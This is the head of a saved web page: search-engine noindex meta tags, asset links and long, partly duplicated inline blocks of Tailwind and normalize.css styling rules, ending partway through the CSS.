<html lang="en"><head>
   <meta name="robots" content="noindex, nofollow"/>
        <meta name="googlebot" content="noindex, nofollow"/>
        <meta name="bingbot" content="noindex, nofollow"/>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <script src="./index_files/tailwindcss-jit-cdn"></script>
        <link rel="stylesheet" data-href="https://fonts.googleapis.com/css?family=Material+Icons|Material+Icons+Outlined|Material+Icons+Two+Tone|Material+Icons+Round|Material+Icons+Sharp&amp;display=block">
        <link rel="stylesheet" data-href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap">

        <link rel="icon" type="image/png" sizes="16x16" href="./index_files/favicon-16x16.png">
        <meta name="msapplication-TileColor" content="#da532c">
        <meta name="theme-color" content="#ffffff">
        <link rel="stylesheet" href="./index_files/index.css"> 
        <!-- <script src="./index_files/index.js.download"></script> -->
        <style id="XHnbcIpZO6O0xyYSAU3Zf">
          /*! tailwindcss v2.2.0 | MIT License | https://tailwindcss.com *//*! normalize.css v8.0.1 | MIT License | github.com/necolas/normalize.css */

/* Document
   ========================================================================== */

/**
 * 1. Correct the line height in all browsers.
 * 2. Prevent adjustments of font size after orientation changes in iOS.
 */

html {
  line-height: 1.15; /* 1 */
  -webkit-text-size-adjust: 100%; /* 2 */
}

/* Sections
   ========================================================================== */

/**
 * Remove the margin in all browsers.
 */

body {
  margin: 0;
}

/**
 * Render the `main` element consistently in IE.
 */

main {
  display: block;
}

/**
 * Correct the font size and margin on `h1` elements within `section` and
 * `article` contexts in Chrome, Firefox, and Safari.
 */

h1 {
  font-size: 2em;
  margin: 0.67em 0;
}

/* Grouping content
   ========================================================================== */

/**
 * 1. Add the correct box sizing in Firefox.
 * 2. Show the overflow in Edge and IE.
 */

hr {
  box-sizing: content-box; /* 1 */
  height: 0; /* 1 */
  overflow: visible; /* 2 */
}

/**
 * 1. Correct the inheritance and scaling of font size in all browsers.
 * 2. Correct the odd `em` font sizing in all browsers.
 */

pre {
  font-family: monospace, monospace; /* 1 */
  font-size: 1em; /* 2 */
}

/* Text-level semantics
   ========================================================================== */

/**
 * Remove the gray background on active links in IE 10.
 */

a {
  background-color: transparent;
}

/**
 * 1. Remove the bottom border in Chrome 57-
 * 2. Add the correct text decoration in Chrome, Edge, IE, Opera, and Safari.
 */

abbr[title] {
  border-bottom: none; /* 1 */
  text-decoration: underline; /* 2 */
  text-decoration: underline dotted; /* 2 */
}

/**
 * Add the correct font weight in Chrome, Edge, and Safari.
 */

b,
strong {
  font-weight: bolder;
}

/**
 * 1. Correct the inheritance and scaling of font size in all browsers.
 * 2. Correct the odd `em` font sizing in all browsers.
 */

code,
kbd,
samp {
  font-family: monospace, monospace; /* 1 */
  font-size: 1em; /* 2 */
}

/**
 * Add the correct font size in all browsers.
 */

small {
  font-size: 80%;
}

/**
 * Prevent `sub` and `sup` elements from affecting the line height in
 * all browsers.
 */

sub,
sup {
  font-size: 75%;
  line-height: 0;
  position: relative;
  vertical-align: baseline;
}

sub {
  bottom: -0.25em;
}

sup {
  top: -0.5em;
}

/* Embedded content
   ========================================================================== */

/**
 * Remove the border on images inside links in IE 10.
 */

img {
  border-style: none;
}

/* Forms
   ========================================================================== */

/**
 * 1. Change the font styles in all browsers.
 * 2. Remove the margin in Firefox and Safari.
 */

button,
input,
optgroup,
select,
textarea {
  font-family: inherit; /* 1 */
  font-size: 100%; /* 1 */
  line-height: 1.15; /* 1 */
  margin: 0; /* 2 */
}

/**
 * Show the overflow in IE.
 * 1. Show the overflow in Edge.
 */

button,
input { /* 1 */
  overflow: visible;
}

/**
 * Remove the inheritance of text transform in Edge, Firefox, and IE.
 * 1. Remove the inheritance of text transform in Firefox.
 */

button,
select { /* 1 */
  text-transform: none;
}

/**
 * Correct the inability to style clickable types in iOS and Safari.
 */

button,
[type="button"],
[type="reset"],
[type="submit"] {
  -webkit-appearance: button;
}

/**
 * Remove the inner border and padding in Firefox.
 */

button::-moz-focus-inner,
[type="button"]::-moz-focus-inner,
[type="reset"]::-moz-focus-inner,
[type="submit"]::-moz-focus-inner {
  border-style: none;
  padding: 0;
}

/**
 * Restore the focus styles unset by the previous rule.
 */

button:-moz-focusring,
[type="button"]:-moz-focusring,
[type="reset"]:-moz-focusring,
[type="submit"]:-moz-focusring {
  outline: 1px dotted ButtonText;
}

/**
 * Correct the padding in Firefox.
 */

fieldset {
  padding: 0.35em 0.75em 0.625em;
}

/**
 * 1. Correct the text wrapping in Edge and IE.
 * 2. Correct the color inheritance from `fieldset` elements in IE.
 * 3. Remove the padding so developers are not caught out when they zero out
 *    `fieldset` elements in all browsers.
 */

legend {
  box-sizing: border-box; /* 1 */
  color: inherit; /* 2 */
  display: table; /* 1 */
  max-width: 100%; /* 1 */
  padding: 0; /* 3 */
  white-space: normal; /* 1 */
}

/**
 * Add the correct vertical alignment in Chrome, Firefox, and Opera.
 */

progress {
  vertical-align: baseline;
}

/**
 * Remove the default vertical scrollbar in IE 10+.
 */

textarea {
  overflow: auto;
}

/**
 * 1. Add the correct box sizing in IE 10.
 * 2. Remove the padding in IE 10.
 */

[type="checkbox"],
[type="radio"] {
  box-sizing: border-box; /* 1 */
  padding: 0; /* 2 */
}

/**
 * Correct the cursor style of increment and decrement buttons in Chrome.
 */

[type="number"]::-webkit-inner-spin-button,
[type="number"]::-webkit-outer-spin-button {
  height: auto;
}

/**
 * 1. Correct the odd appearance in Chrome and Safari.
 * 2. Correct the outline style in Safari.
 */

[type="search"] {
  -webkit-appearance: textfield; /* 1 */
  outline-offset: -2px; /* 2 */
}

/**
 * Remove the inner padding in Chrome and Safari on macOS.
 */

[type="search"]::-webkit-search-decoration {
  -webkit-appearance: none;
}

/**
 * 1. Correct the inability to style clickable types in iOS and Safari.
 * 2. Change font properties to `inherit` in Safari.
 */

::-webkit-file-upload-button {
  -webkit-appearance: button; /* 1 */
  font: inherit; /* 2 */
}

/* Interactive
   ========================================================================== */

/*
 * Add the correct display in Edge, IE 10+, and Firefox.
 */

details {
  display: block;
}

/*
 * Add the correct display in all browsers.
 */

summary {
  display: list-item;
}

/* Misc
   ========================================================================== */

/**
 * Add the correct display in IE 10+.
 */

template {
  display: none;
}

/**
 * Add the correct display in IE 10.
 */

[hidden] {
  display: none;
}/**
 * Manually forked from SUIT CSS Base: https://github.com/suitcss/base
 * A thin layer on top of normalize.css that provides a starting point more
 * suitable for web applications.
 */

/**
 * Removes the default spacing and border for appropriate elements.
 */

blockquote,
dl,
dd,
h1,
h2,
h3,
h4,
h5,
h6,
hr,
figure,
p,
pre {
  margin: 0;
}

button {
  background-color: transparent;
  background-image: none;
}

/**
 * Work around a Firefox/IE bug where the transparent `button` background
 * results in a loss of the default `button` focus styles.
 */

button:focus {
  outline: 1px dotted;
  outline: 5px auto -webkit-focus-ring-color;
}

fieldset {
  margin: 0;
  padding: 0;
}

ol,
ul {
  list-style: none;
  margin: 0;
  padding: 0;
}

/**
 * Tailwind custom reset styles
 */

/**
 * 1. Use the user's configured `sans` font-family (with Tailwind's default
 *    sans-serif font stack as a fallback) as a sane default.
 * 2. Use Tailwind's default "normal" line-height so the user isn't forced
 *    to override it to ensure consistency even when using the default theme.
 */

html {
  font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji"; /* 1 */
  line-height: 1.5; /* 2 */
}


/**
 * Inherit font-family and line-height from `html` so users can set them as
 * a class directly on the `html` element.
 */

body {
  font-family: inherit;
  line-height: inherit;
}

/**
 * 1. Prevent padding and border from affecting element width.
 *
 *    We used to set this in the html element and inherit from
 *    the parent element for everything else. This caused issues
 *    in shadow-dom-enhanced elements like <details> where the content
 *    is wrapped by a div with box-sizing set to `content-box`.
 *
 *    https://github.com/mozdevs/cssremedy/issues/4
 *
 *
 * 2. Allow adding a border to an element by just adding a border-width.
 *
 *    By default, the way the browser specifies that an element should have no
 *    border is by setting it's border-style to `none` in the user-agent
 *    stylesheet.
 *
 *    In order to easily add borders to elements by just setting the `border-width`
 *    property, we change the default border-style for all elements to `solid`, and
 *    use border-width to hide them instead. This way our `border` utilities only
 *    need to set the `border-width` property instead of the entire `border`
 *    shorthand, making our border utilities much more straightforward to compose.
 *
 *    https://github.com/tailwindcss/tailwindcss/pull/116
 */

*,
::before,
::after {
  box-sizing: border-box; /* 1 */
  border-width: 0; /* 2 */
  border-style: solid; /* 2 */
  border-color: currentColor; /* 2 */
}

/*
 * Ensure horizontal rules are visible by default
 */

hr {
  border-top-width: 1px;
}

/**
 * Undo the `border-style: none` reset that Normalize applies to images so that
 * our `border-{width}` utilities have the expected effect.
 *
 * The Normalize reset is unnecessary for us since we default the border-width
 * to 0 on all elements.
 *
 * https://github.com/tailwindcss/tailwindcss/issues/362
 */

img {
  border-style: solid;
}

textarea {
  resize: vertical;
}

input::placeholder,
textarea::placeholder {
  opacity: 1;
  color: #9ca3af;
}

button,
[role="button"] {
  cursor: pointer;
}

table {
  border-collapse: collapse;
}

h1,
h2,
h3,
h4,
h5,
h6 {
  font-size: inherit;
  font-weight: inherit;
}

/**
 * Reset links to optimize for opt-in styling instead of
 * opt-out.
 */

a {
  color: inherit;
  text-decoration: inherit;
}

/**
 * Reset form element properties that are easy to forget to
 * style explicitly so you don't inadvertently introduce
 * styles that deviate from your design system. These styles
 * supplement a partial reset that is already applied by
 * normalize.css.
 */

button,
input,
optgroup,
select,
textarea {
  padding: 0;
  line-height: inherit;
  color: inherit;
}

/**
 * Use the configured 'mono' font family for elements that
 * are expected to be rendered with a monospace font, falling
 * back to the system monospace stack if there is no configured
 * 'mono' font family.
 */

pre,
code,
kbd,
samp {
  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
}

/**
 * 1. Make replaced elements `display: block` by default as that's
 *    the behavior you want almost all of the time. Inspired by
 *    CSS Remedy, with `svg` added as well.
 *
 *    https://github.com/mozdevs/cssremedy/issues/14
 * 
 * 2. Add `vertical-align: middle` to align replaced elements more
 *    sensibly by default when overriding `display` by adding a
 *    utility like `inline`.
 *
 *    This can trigger a poorly considered linting error in some
 *    tools but is included by design.
 * 
 *    https://github.com/jensimmons/cssremedy/issues/14#issuecomment-634934210
 */

img,
svg,
video,
canvas,
audio,
iframe,
embed,
object {
  display: block; /* 1 */
  vertical-align: middle; /* 2 */
}

/**
 * Constrain images and videos to the parent width and preserve
 * their intrinsic aspect ratio.
 *
 * https://github.com/mozdevs/cssremedy/issues/14
 */

img,
video {
  max-width: 100%;
  height: auto;
}

*, ::before, ::after {
  --tw-translate-x: 0;
  --tw-translate-y: 0;
  --tw-rotate: 0;
  --tw-skew-x: 0;
  --tw-skew-y: 0;
  --tw-scale-x: 1;
  --tw-scale-y: 1;
  --tw-transform: translateX(var(--tw-translate-x)) translateY(var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
  --tw-border-opacity: 1;
  border-color: rgba(229, 231, 235, var(--tw-border-opacity));
  --tw-shadow: 0 0 #0000;
  --tw-ring-inset: var(--tw-empty,/*!*/ /*!*/);
  --tw-ring-offset-width: 0px;
  --tw-ring-offset-color: #fff;
  --tw-ring-color: rgba(59, 130, 246, 0.5);
  --tw-ring-offset-shadow: 0 0 #0000;
  --tw-ring-shadow: 0 0 #0000;
  --tw-blur: var(--tw-empty,/*!*/ /*!*/);
  --tw-brightness: var(--tw-empty,/*!*/ /*!*/);
  --tw-contrast: var(--tw-empty,/*!*/ /*!*/);
  --tw-grayscale: var(--tw-empty,/*!*/ /*!*/);
  --tw-hue-rotate: var(--tw-empty,/*!*/ /*!*/);
  --tw-invert: var(--tw-empty,/*!*/ /*!*/);
  --tw-saturate: var(--tw-empty,/*!*/ /*!*/);
  --tw-sepia: var(--tw-empty,/*!*/ /*!*/);
  --tw-drop-shadow: var(--tw-empty,/*!*/ /*!*/);
  --tw-filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow);
  --tw-backdrop-blur: var(--tw-empty,/*!*/ /*!*/);
  --tw-backdrop-brightness: var(--tw-empty,/*!*/ /*!*/);
  --tw-backdrop-contrast: var(--tw-empty,/*!*/ /*!*/);
  --tw-backdrop-grayscale: var(--tw-empty,/*!*/ /*!*/);
  --tw-backdrop-hue-rotate: var(--tw-empty,/*!*/ /*!*/);
  --tw-backdrop-invert: var(--tw-empty,/*!*/ /*!*/);
  --tw-backdrop-opacity: var(--tw-empty,/*!*/ /*!*/);
  --tw-backdrop-saturate: var(--tw-empty,/*!*/ /*!*/);
  --tw-backdrop-sepia: var(--tw-empty,/*!*/ /*!*/);
  --tw-backdrop-filter: var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia);
}

[type='text'],[type='email'],[type='url'],[type='password'],[type='number'],[type='date'],[type='datetime-local'],[type='month'],[type='search'],[type='tel'],[type='time'],[type='week'],[multiple],textarea,select {
  appearance: none;
  background-color: #fff;
  border-color: #6b7280;
  border-width: 1px;
  border-radius: 0px;
  padding-top: 0.5rem;
  padding-right: 0.75rem;
  padding-bottom: 0.5rem;
  padding-left: 0.75rem;
  font-size: 1rem;
  line-height: 1.5rem;
}

[type='text']:focus, [type='email']:focus, [type='url']:focus, [type='password']:focus, [type='number']:focus, [type='date']:focus, [type='datetime-local']:focus, [type='month']:focus, [type='search']:focus, [type='tel']:focus, [type='time']:focus, [type='week']:focus, [multiple]:focus, textarea:focus, select:focus {
  outline: 2px solid transparent;
  outline-offset: 2px;
  --tw-ring-inset: var(--tw-empty,/*!*/ /*!*/);
  --tw-ring-offset-width: 0px;
  --tw-ring-offset-color: #fff;
  --tw-ring-color: #2563eb;
  --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
  --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
  box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
  border-color: #2563eb;
}

input::placeholder,textarea::placeholder {
  color: #6b7280;
  opacity: 1;
}

::-webkit-datetime-edit-fields-wrapper {
  padding: 0;
}

::-webkit-date-and-time-value {
  min-height: 1.5em;
}

select {
  background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3e%3cpath stroke='%236b7280' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M6 8l4 4 4-4'/%3e%3c/svg%3e");
  background-position: right 0.5rem center;
  background-repeat: no-repeat;
  background-size: 1.5em 1.5em;
  padding-right: 2.5rem;
  color-adjust: exact;
}

[multiple] {
  background-image: initial;
  background-position: initial;
  background-repeat: unset;
  background-size: initial;
  padding-right: 0.75rem;
  color-adjust: unset;
}

[type='checkbox'],[type='radio'] {
  appearance: none;
  padding: 0;
  color-adjust: exact;
  display: inline-block;
  vertical-align: middle;
  background-origin: border-box;
  user-select: none;
  flex-shrink: 0;
  height: 1rem;
  width: 1rem;
  color: #2563eb;
  background-color: #fff;
  border-color: #6b7280;
  border-width: 1px;
}

[type='checkbox'] {
  border-radius: 0px;
}

[type='radio'] {
  border-radius: 100%;
}

[type='checkbox']:focus,[type='radio']:focus {
  outline: 2px solid transparent;
  outline-offset: 2px;
  --tw-ring-inset: var(--tw-empty,/*!*/ /*!*/);
  --tw-ring-offset-width: 2px;
  --tw-ring-offset-color: #fff;
  --tw-ring-color: #2563eb;
  --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
  --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
  box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
}

[type='checkbox']:checked,[type='radio']:checked {
  border-color: transparent;
  background-color: currentColor;
  background-size: 100% 100%;
  background-position: center;
  background-repeat: no-repeat;
}

[type='checkbox']:checked {
  background-image: url("data:image/svg+xml,%3csvg viewBox='0 0 16 16' fill='white' xmlns='http://www.w3.org/2000/svg'%3e%3cpath d='M12.207 4.793a1 1 0 010 1.414l-5 5a1 1 0 01-1.414 0l-2-2a1 1 0 011.414-1.414L6.5 9.086l4.293-4.293a1 1 0 011.414 0z'/%3e%3c/svg%3e");
}

[type='radio']:checked {
  background-image: url("data:image/svg+xml,%3csvg viewBox='0 0 16 16' fill='white' xmlns='http://www.w3.org/2000/svg'%3e%3ccircle cx='8' cy='8' r='3'/%3e%3c/svg%3e");
}

[type='checkbox']:checked:hover,[type='checkbox']:checked:focus,[type='radio']:checked:hover,[type='radio']:checked:focus {
  border-color: transparent;
  background-color: currentColor;
}

[type='checkbox']:indeterminate {
  background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 16 16'%3e%3cpath stroke='white' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M4 8h8'/%3e%3c/svg%3e");
  border-color: transparent;
  background-color: currentColor;
  background-size: 100% 100%;
  background-position: center;
  background-repeat: no-repeat;
}

[type='checkbox']:indeterminate:hover,[type='checkbox']:indeterminate:focus {
  border-color: transparent;
  background-color: currentColor;
}

[type='file'] {
  background: unset;
  border-color: inherit;
  border-width: 0;
  border-radius: 0;
  padding: 0;
  font-size: unset;
  line-height: inherit;
}

[type='file']:focus {
  outline: 1px auto -webkit-focus-ring-color;
}
      
      .visible {
  visibility: visible;
}
      
      .fixed {
  position: fixed;
}
      
      .bottom-0 {
  bottom: 0px;
}
      
      .right-\[-420px\] {
  right: -420px;
}
      
      .top-\[72px\] {
  top: 72px;
}
      
      .z-50 {
  z-index: 50;
}
      
      .mr-3 {
  margin-right: 0.75rem;
}
      
      .ml-auto {
  margin-left: auto;
}
      
      .block {
  display: block;
}
      
      .inline {
  display: inline;
}
      
      .flex {
  display: flex;
}
      
      .inline-flex {
  display: inline-flex;
}
      
      .table {
  display: table;
}
      
      .hidden {
  display: none;
}
      
      .h-7 {
  height: 1.75rem;
}
      
      .w-full {
  width: 100%;
}
      
      .w-7 {
  width: 1.75rem;
}
      
      .w-\[420px\] {
  width: 420px;
}
      
      .flex-shrink {
  flex-shrink: 1;
}
      
      .border-collapse {
  border-collapse: collapse;
}
      
      .cursor-pointer {
  cursor: pointer;
}
      
      .resize {
  resize: both;
}
      
      .items-center {
  align-items: center;
}
      
      .justify-start {
  justify-content: flex-start;
}
      
      .gap-4 {
  gap: 1rem;
}
      
      .rounded-lg {
  border-radius: 0.5rem;
}
      
      .border {
  border-width: 1px;
}
      
      .border-b {
  border-bottom-width: 1px;
}
      
      .bg-white {
  --tw-bg-opacity: 1;
  background-color: rgba(255, 255, 255, var(--tw-bg-opacity));
}
      
      .p-5 {
  padding: 1.25rem;
}
      
      .text-lg {
  font-size: 1.125rem;
  line-height: 1.75rem;
}
      
      .text-sm {
  font-size: 0.875rem;
  line-height: 1.25rem;
}
      
      .font-bold {
  font-weight: 700;
}
      
      .font-medium {
  font-weight: 500;
}
      
      .text-gray-500 {
  --tw-text-opacity: 1;
  color: rgba(107, 114, 128, var(--tw-text-opacity));
}
      
      .text-gray-600 {
  --tw-text-opacity: 1;
  color: rgba(75, 85, 99, var(--tw-text-opacity));
}
      
      .text-blue-500 {
  --tw-text-opacity: 1;
  color: rgba(59, 130, 246, var(--tw-text-opacity));
}
      
      .text-gray-400 {
  --tw-text-opacity: 1;
  color: rgba(156, 163, 175, var(--tw-text-opacity));
}
      
      .underline {
  text-decoration: underline;
}
      
      .shadow-lg {
  --tw-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
  box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
}
      
      .transition-all {
  transition-property: all;
  transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  transition-duration: 150ms;
}
      
      .hover\:bg-blue-50:hover {
  --tw-bg-opacity: 1;
  background-color: rgba(239, 246, 255, var(--tw-bg-opacity));
}
      </style>
        <style id="c8xKqhTAOTM-6GlRVK3P8">
            html {
                line-height: 1.15; /* 1 */
                -webkit-text-size-adjust: 100%; /* 2 */
            }


            body {
                margin: 0;
            }


            main {
                display: block;
            }



            h1 {
                font-size: 2em;
                margin: 0.67em 0;
            }



            hr {
                box-sizing: content-box; /* 1 */
                height: 0; /* 1 */
                overflow: visible; /* 2 */
            }



            pre {
                font-family: monospace, monospace; /* 1 */
                font-size: 1em; /* 2 */
            }



            a {
                background-color: transparent;
            }



            abbr[title] {
                border-bottom: none; /* 1 */
                text-decoration: underline; /* 2 */
                text-decoration: underline dotted; /* 2 */
            }



            b,
            strong {
                font-weight: bolder;
            }

            code,
            kbd,
            samp {
                font-family: monospace, monospace; /* 1 */
                font-size: 1em; /* 2 */
            }

            /**
 * Add the correct font size in all browsers.
 */

            small {
                font-size: 80%;
            }

            /**
 * Prevent `sub` and `sup` elements from affecting the line height in
 * all browsers.
 */

            sub,
            sup {
                font-size: 75%;
                line-height: 0;
                position: relative;
                vertical-align: baseline;
            }

            sub {
                bottom: -0.25em;
            }

            sup {
                top: -0.5em;
            }

            /* Embedded content
   ========================================================================== */

            /**
 * Remove the border on images inside links in IE 10.
 */

            img {
                border-style: none;
            }

 

            button,
            input,
            optgroup,
            select,
            textarea {
                font-family: inherit; /* 1 */
                font-size: 100%; /* 1 */
                line-height: 1.15; /* 1 */
                margin: 0; /* 2 */
            }

            /**
 * Show the overflow in IE.
 * 1. Show the overflow in Edge.
 */

            button,
            input {
                /* 1 */
                overflow: visible;
            }

            /**
 * Remove the inheritance of text transform in Edge, Firefox, and IE.
 * 1. Remove the inheritance of text transform in Firefox.
 */

            button,
            select {
                /* 1 */
                text-transform: none;
            }

            /**
 * Correct the inability to style clickable types in iOS and Safari.
 */

            button,
            [type="button"],
            [type="reset"],
            [type="submit"] {
                -webkit-appearance: button;
            }

            /**
 * Remove the inner border and padding in Firefox.
 */

            button::-moz-focus-inner,
            [type="button"]::-moz-focus-inner,
            [type="reset"]::-moz-focus-inner,
            [type="submit"]::-moz-focus-inner {
                border-style: none;
                padding: 0;
            }

            /**
 * Restore the focus styles unset by the previous rule.
 */

            button:-moz-focusring,
            [type="button"]:-moz-focusring,
            [type="reset"]:-moz-focusring,
            [type="submit"]:-moz-focusring {
                outline: 1px dotted ButtonText;
            }

            /**
 * Correct the padding in Firefox.
 */

            fieldset {
                padding: 0.35em 0.75em 0.625em;
            }

            /**
 * 1. Correct the text wrapping in Edge and IE.
 * 2. Correct the color inheritance from `fieldset` elements in IE.
 * 3. Remove the padding so developers are not caught out when they zero out
 *    `fieldset` elements in all browsers.
 */

            legend {
                box-sizing: border-box; /* 1 */
                color: inherit; /* 2 */
                display: table; /* 1 */
                max-width: 100%; /* 1 */
                padding: 0; /* 3 */
                white-space: normal; /* 1 */
            }

            /**
 * Add the correct vertical alignment in Chrome, Firefox, and Opera.
 */

            progress {
                vertical-align: baseline;
            }

            /**
 * Remove the default vertical scrollbar in IE 10+.
 */

            textarea {
                overflow: auto;
            }

            /**
 * 1. Add the correct box sizing in IE 10.
 * 2. Remove the padding in IE 10.
 */

            [type="checkbox"],
            [type="radio"] {
                box-sizing: border-box; /* 1 */
                padding: 0; /* 2 */
            }

            /**
 * Correct the cursor style of increment and decrement buttons in Chrome.
 */

            [type="number"]::-webkit-inner-spin-button,
            [type="number"]::-webkit-outer-spin-button {
                height: auto;
            }

            /**
 * 1. Correct the odd appearance in Chrome and Safari.
 * 2. Correct the outline style in Safari.
 */

            [type="search"] {
                -webkit-appearance: textfield; /* 1 */
                outline-offset: -2px; /* 2 */
            }

            /**
 * Remove the inner padding in Chrome and Safari on macOS.
 */

            [type="search"]::-webkit-search-decoration {
                -webkit-appearance: none;
            }

            /**
 * 1. Correct the inability to style clickable types in iOS and Safari.
 * 2. Change font properties to `inherit` in Safari.
 */

            ::-webkit-file-upload-button {
                -webkit-appearance: button; /* 1 */
                font: inherit; /* 2 */
            }

            /* Interactive
   ========================================================================== */

            /*
 * Add the correct display in Edge, IE 10+, and Firefox.
 */

            details {
                display: block;
            }

            /*
 * Add the correct display in all browsers.
 */

            summary {
                display: list-item;
            }

            /* Misc
   ========================================================================== */

            /**
 * Add the correct display in IE 10+.
 */

            template {
                display: none;
            }

            /**
 * Add the correct display in IE 10.
 */

            [hidden] {
                display: none;
            } /**
 * Manually forked from SUIT CSS Base: https://github.com/suitcss/base
 * A thin layer on top of normalize.css that provides a starting point more
 * suitable for web applications.
 */

            /**
 * Removes the default spacing and border for appropriate elements.
 */

            blockquote,
            dl,
            dd,
            h1,
            h2,
            h3,
            h4,
            h5,
            h6,
            hr,
            figure,
            p,
            pre {
                margin: 0;
            }

            button {
                background-color: transparent;
                background-image: none;
            }

            /**
 * Work around a Firefox/IE bug where the transparent `button` background
 * results in a loss of the default `button` focus styles.
 */

            button:focus {
                outline: 1px dotted;
                outline: 5px auto -webkit-focus-ring-color;
            }

            fieldset {
                margin: 0;
                padding: 0;
            }

            ol,
            ul {
                list-style: none;
                margin: 0;
                padding: 0;
            }

            /**
 * Tailwind custom reset styles
 */

            /**
 * 1. Use the user's configured `sans` font-family (with Tailwind's default
 *    sans-serif font stack as a fallback) as a sane default.
 * 2. Use Tailwind's default "normal" line-height so the user isn't forced
 *    to override it to ensure consistency even when using the default theme.
 */

            html {
                font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji"; /* 1 */
                line-height: 1.5; /* 2 */
            }

            /**
 * Inherit font-family and line-height from `html` so users can set them as
 * a class directly on the `html` element.
 */

            body {
                font-family: inherit;
                line-height: inherit;
            }

            /**
 * 1. Prevent padding and border from affecting element width.
 *
 *    We used to set this in the html element and inherit from
 *    the parent element for everything else. This caused issues
 *    in shadow-dom-enhanced elements like <details> where the content
 *    is wrapped by a div with box-sizing set to `content-box`.
 *
 *    https://github.com/mozdevs/cssremedy/issues/4
 *
 *
 * 2. Allow adding a border to an element by just adding a border-width.
 *
 *    By default, the way the browser specifies that an element should have no
 *    border is by setting it's border-style to `none` in the user-agent
 *    stylesheet.
 *
 *    In order to easily add borders to elements by just setting the `border-width`
 *    property, we change the default border-style for all elements to `solid`, and
 *    use border-width to hide them instead. This way our `border` utilities only
 *    need to set the `border-width` property instead of the entire `border`
 *    shorthand, making our border utilities much more straightforward to compose.
 *
 *    https://github.com/tailwindcss/tailwindcss/pull/116
 */

            *,
            ::before,
            ::after {
                box-sizing: border-box; /* 1 */
                border-width: 0; /* 2 */
                border-style: solid; /* 2 */
                border-color: currentColor; /* 2 */
            }

            /*
 * Ensure horizontal rules are visible by default
 */

            hr {
                border-top-width: 1px;
            }

            /**
 * Undo the `border-style: none` reset that Normalize applies to images so that
 * our `border-{width}` utilities have the expected effect.
 *
 * The Normalize reset is unnecessary for us since we default the border-width
 * to 0 on all elements.
 *
 * https://github.com/tailwindcss/tailwindcss/issues/362
 */

            img {
                border-style: solid;
            }

            textarea {
                resize: vertical;
            }

            input::placeholder,
            textarea::placeholder {
                opacity: 1;
                color: #9ca3af;
            }

            button,
            [role="button"] {
                cursor: pointer;
            }

            table {
                border-collapse: collapse;
            }

            h1,
            h2,
            h3,
            h4,
            h5,
            h6 {
                font-size: inherit;
                font-weight: inherit;
            }

            /**
 * Reset links to optimize for opt-in styling instead of
 * opt-out.
 */

            a {
                color: inherit;
                text-decoration: inherit;
            }

            /**
 * Reset form element properties that are easy to forget to
 * style explicitly so you don't inadvertently introduce
 * styles that deviate from your design system. These styles
 * supplement a partial reset that is already applied by
 * normalize.css.
 */

            button,
            input,
            optgroup,
            select,
            textarea {
                padding: 0;
                line-height: inherit;
                color: inherit;
            }

            /**
 * Use the configured 'mono' font family for elements that
 * are expected to be rendered with a monospace font, falling
 * back to the system monospace stack if there is no configured
 * 'mono' font family.
 */

            pre,
            code,
            kbd,
            samp {
                font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
            }

            /**
 * 1. Make replaced elements `display: block` by default as that's
 *    the behavior you want almost all of the time. Inspired by
 *    CSS Remedy, with `svg` added as well.
 *
 *    https://github.com/mozdevs/cssremedy/issues/14
 * 
 * 2. Add `vertical-align: middle` to align replaced elements more
 *    sensibly by default when overriding `display` by adding a
 *    utility like `inline`.
 *
 *    This can trigger a poorly considered linting error in some
 *    tools but is included by design.
 * 
 *    https://github.com/jensimmons/cssremedy/issues/14#issuecomment-634934210
 */

            img,
            svg,
            video,
            canvas,
            audio,
            iframe,
            embed,
            object {
                display: block; /* 1 */
                vertical-align: middle; /* 2 */
            }

            /**
 * Constrain images and videos to the parent width and preserve
 * their intrinsic aspect ratio.
 *
 * https://github.com/mozdevs/cssremedy/issues/14
 */

            img,
            video {
                max-width: 100%;
